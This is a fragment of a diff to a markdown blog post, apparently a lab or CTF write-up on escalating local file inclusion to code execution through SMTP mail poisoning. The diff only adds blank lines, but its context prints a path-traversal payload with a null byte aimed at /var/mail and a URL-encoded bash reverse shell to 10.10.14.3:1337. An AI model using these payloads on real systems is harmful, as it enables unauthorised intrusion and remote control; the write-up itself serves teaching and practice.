@@ -37,6 +37,7 @@ Subject: This is exploit
 quit
 ```
 now go to burpsuite and access the file "../../../../../../../..//var/mail/asterisk%00"
+
 ![exploit saved in the mail](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/lfi-smtp-2.png)
 
 Yes we successfully exploited the whoami command n the system.
@@ -53,6 +54,7 @@ Then url encode it,
 bash+-i>%26+/dev/tcp/10.10.14.3/1337+0>%261
 ```
 using a netcat listner we can catch the reverse shell
+
 ![Got the reverse shell](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/lfi-smtp-3.png)
 
 
